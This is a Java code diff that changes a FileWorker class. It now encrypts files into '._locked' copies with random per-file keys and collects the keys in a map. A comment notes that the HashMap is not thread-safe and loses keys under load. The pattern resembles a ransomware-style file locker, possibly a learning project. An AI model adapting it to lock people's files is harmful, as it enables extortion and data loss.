@@ -6,20 +6,25 @@ import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.nio.file.Path;
+import java.util.HashMap;
 import java.util.HashSet;
 import java.util.List;
+import java.util.Map;
 import java.util.Set;
 
 public class FileWorker implements Worker {
 
-	private final Encrypter encrypter;
+	private final RandomKeyEncrypter encrypter;
 
 	private final Decrypter decrypter;
 
-	public FileWorker(Encrypter encrypter, Decrypter decrypter) {
+	private final Map<String, String> keys;
+	
+	public FileWorker(RandomKeyEncrypter encrypter, Decrypter decrypter) {
 		super();
 		this.encrypter = encrypter;
 		this.decrypter = decrypter;
+		this.keys = new HashMap<>();
 	}
 
 	@Override
@@ -31,10 +36,18 @@ public class FileWorker implements Worker {
 				try {
 					File outputFile = Path.of(file.getAbsolutePath() + "._locked").toFile();
 					outputFile.createNewFile();
-					this.encrypter.encrypt(new FileInputStream(file), new FileOutputStream(outputFile));
+					String randomKey = this.encrypter.encrypt(new FileInputStream(file), new FileOutputStream(outputFile));
+	
+					// Caution here !
+					// HashMap is not thread safe
+					// meaning that this can break
+					// Try to encrypt 3000 files and see the number of keys in the hashmap
+					// generally it will be lower than 3000
+					this.keys.put(file.getAbsolutePath(), randomKey);
 					
 					System.out.println("Encryption : "+outputFile.getAbsolutePath());
-				} catch (IOException e) {
+					
+				} catch (IOException  e) {
 					e.printStackTrace();
 				} 
 			});
@@ -83,5 +96,10 @@ public class FileWorker implements Worker {
 				e.printStackTrace();
 			}
 		}
+	}
+
+	@Override
+	public Map<String, String> getKeys() {
+		return this.keys;
 	}
 }
